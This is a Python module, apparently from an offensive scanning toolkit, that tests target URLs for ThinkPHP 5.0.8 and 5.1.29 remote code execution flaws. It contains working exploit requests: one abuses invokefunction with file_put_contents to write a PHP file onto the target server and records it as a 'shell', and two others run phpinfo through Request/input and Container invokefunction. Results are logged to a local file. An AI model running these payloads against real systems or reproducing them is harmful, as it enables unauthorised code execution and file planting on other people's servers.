#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan9:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None



    def run25(self, urls):
        try:
            url = urls + '/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uploads/1321231.php&vars[1][]=<?php phpinfo();?>'

            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/uploads/1321231.php"
            response2 = requests.get(url2, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                     proxies=self.proxy)
            if "disable_functions" in response2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.8-RCE-POC-3')
                OutPrintInfo("ThinkPHP", f"{url}\n")

                OutPrintInfo("ThinkPHP", f"SHELL {url2}")
                with open("./result/thinkphpRce9.txt","a") as w:
                    w.write(f"存在ThinkPHP-5.0.8-RCE-POC-3 {url} --- shell {url2}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-3')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.8-RCE-POC-3')
    def run26(self, urls):
        try:
            url = urls + '/?s=index/\think\Request/input&filter=phpinfo&data=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.1.29-RCE-POC-1')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                # OutPrintInfo("ThinkPHP", f"{url}")
                with open("./result/thinkphpRce9.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.1.29-RCE-POC-1 {url}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-1')
    def run27(self, urls):
        try:
            url = urls + '/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.1.29-RCE-POC-2')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                with open("./result/thinkphpRce9.txt","a") as w:
                    w.write(f"存在ThinkPHP-5.1.29-RCE-POC-2 {url}\n")

            else:
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-2')
                pass

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.1.29-RCE-POC-2')

    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run25(url)
        # OutPrintInfo("ThinkPHP", '开始POC-25...')
        self.run26(url)
        # OutPrintInfo("ThinkPHP", '开始POC-26...')
        self.run27(url)
